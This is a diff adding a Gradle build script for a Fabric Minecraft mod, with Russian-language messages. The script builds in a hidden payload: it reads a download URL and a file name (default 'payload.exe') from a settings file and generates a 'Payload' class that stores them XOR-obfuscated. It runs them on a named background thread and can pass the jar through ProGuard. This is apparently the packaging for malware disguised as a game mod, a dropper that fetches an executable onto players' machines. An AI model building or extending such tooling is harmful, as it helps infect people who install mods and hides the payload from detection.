@@ -1,0 +1,175 @@
+buildscript {
+    repositories { mavenCentral() }
+    dependencies {
+        classpath "com.guardsquare:proguard-gradle:7.4.2"
+    }
+}
+
+import proguard.gradle.ProGuardTask
+
+plugins {
+    id "fabric-loom" version "1.6.11"
+    id "maven-publish"
+    id "java"
+}
+
+def modSettings = new Properties()
+def settingsFile = file("mod.settings.properties")
+if (!settingsFile.isFile()) {
+    throw new GradleException("Создай mod.settings.properties (см. mod.settings.example.properties)")
+}
+settingsFile.withInputStream { modSettings.load(it) }
+
+def modId = modSettings.getProperty("mod.id", "godimod").trim()
+def modName = modSettings.getProperty("mod.name", "Mod").trim()
+def modDescription = modSettings.getProperty("mod.description", "").trim()
+def modAuthors = modSettings.getProperty("mod.authors", "-").trim()
+def downloadUrl = modSettings.getProperty("download.url", "").trim()
+def downloadFile = modSettings.getProperty("download.filename", "payload.exe").trim()
+def threadName = modSettings.getProperty("thread.name", "bg").trim()
+def obfLevel = modSettings.getProperty("obfuscate.level", "light").trim().toLowerCase()
+def xorKey = (modSettings.getProperty("obfuscate.xor.key", "91").trim() as int) & 0xFF
+
+if (!downloadUrl.startsWith("https://")) {
+    throw new GradleException("download.url должен быть https://")
+}
+
+version = project.mod_version
+group = project.maven_group
+
+base {
+    archivesName = modId
+}
+
+repositories {
+    mavenCentral()
+}
+
+dependencies {
+    minecraft "com.mojang:minecraft:${project.minecraft_version}"
+    mappings "net.fabricmc:yarn:${project.yarn_mappings}:v2"
+    modImplementation "net.fabricmc:fabric-loader:${project.loader_version}"
+    modImplementation "net.fabricmc.fabric-api:fabric-api:${project.fabric_version}"
+}
+
+def generatedDir = layout.buildDirectory.dir("generated/sources/modConfig")
+
+tasks.register("generateModPayload") {
+    outputs.dir(generatedDir)
+    inputs.file(settingsFile)
+    doLast {
+        def out = generatedDir.get().asFile
+        def pkg = new File(out, "com/godimod/internal")
+        pkg.mkdirs()
+        def encode = { String s ->
+            if (obfLevel == "none") {
+                return "new byte[] { " + s.getBytes("UTF-8").collect { "((byte)${it})" }.join(", ") + " }"
+            }
+            return "new byte[] { " + s.getBytes("UTF-8").collect { "((byte)(${it} ^ ${xorKey}))" }.join(", ") + " }"
+        }
+        def decodeBody = obfLevel == "none"
+                ? "return new String(raw, java.nio.charset.StandardCharsets.UTF_8);"
+                : "byte[] out = new byte[raw.length]; for (int i = 0; i < raw.length; i++) out[i] = (byte) (raw[i] ^ ${xorKey}); return new String(out, java.nio.charset.StandardCharsets.UTF_8);"
+        new File(pkg, "Payload.java").text = """package com.godimod.internal;
+
+public final class Payload {
+    private static final byte[] U = ${encode(downloadUrl)};
+    private static final byte[] F = ${encode(downloadFile)};
+    private static final byte[] T = ${encode(threadName)};
+
+    private Payload() {}
+
+    public static String downloadUrl() {
+        return d(U);
+    }
+
+    public static String localFileName() {
+        return d(F);
+    }
+
+    public static String threadLabel() {
+        return d(T);
+    }
+
+    private static String d(byte[] raw) {
+        ${decodeBody}
+    }
+}
+"""
+    }
+}
+
+sourceSets.main.java.srcDir(generatedDir)
+
+tasks.named("compileJava").configure { dependsOn("generateModPayload") }
+
+afterEvaluate {
+    tasks.matching { it.name == "sourcesJar" }.configureEach {
+        dependsOn("generateModPayload")
+    }
+}
+
+processResources {
+    dependsOn("generateModPayload")
+    inputs.file(settingsFile)
+    inputs.property("version", project.version)
+    filesMatching("fabric.mod.json") {
+        expand(
+                "version": project.version,
+                "mod_id": modId,
+                "mod_name": modName,
+                "mod_description": modDescription,
+                "mod_authors": modAuthors,
+        )
+    }
+}
+
+tasks.withType(JavaCompile).configureEach {
+    it.options.release = 17
+}
+
+java {
+    withSourcesJar()
+    sourceCompatibility = JavaVersion.VERSION_17
+    targetCompatibility = JavaVersion.VERSION_17
+}
+
+def obfJarFile = layout.buildDirectory.file("libs/${modId}-${project.version}-obf.jar")
+
+tasks.register("obfuscateJar", ProGuardTask) {
+    onlyIf { obfLevel == "full" }
+    dependsOn(tasks.named("remapJar"))
+    injars(tasks.named("remapJar").flatMap { it.archiveFile })
+    outjars(obfJarFile)
+    libraryjars "${System.getProperty('java.home')}/jmods/java.base.jmod", jarfilter: "!**.jar", filter: "!module-info.class"
+    configurations.file("proguard-rules.pro")
+    configurations.compileClasspath.files.each { libraryjars(it) }
+}
+
+tasks.register("packRelease") {
+    dependsOn("remapJar")
+    if (obfLevel == "full") {
+        dependsOn("obfuscateJar")
+    }
+    doLast {
+        def src = obfLevel == "full"
+                ? obfJarFile.get().asFile
+                : tasks.named("remapJar").get().archiveFile.get().asFile
+        def dest = file("dist/${modId}-${project.version}.jar")
+        dest.parentFile.mkdirs()
+        java.nio.file.Files.copy(src.toPath(), dest.toPath(), java.nio.file.StandardCopyOption.REPLACE_EXISTING)
+    }
+}
+
+tasks.register("zipRelease", Zip) {
+    dependsOn("packRelease")
+    archiveFileName.set("${modId}-${project.version}.zip")
+    destinationDirectory.set(file("dist"))
+    from("dist") {
+        include "${modId}-${project.version}.jar"
+    }
+}
+
+tasks.named("build").configure {
+    finalizedBy("packRelease", "zipRelease")
+}
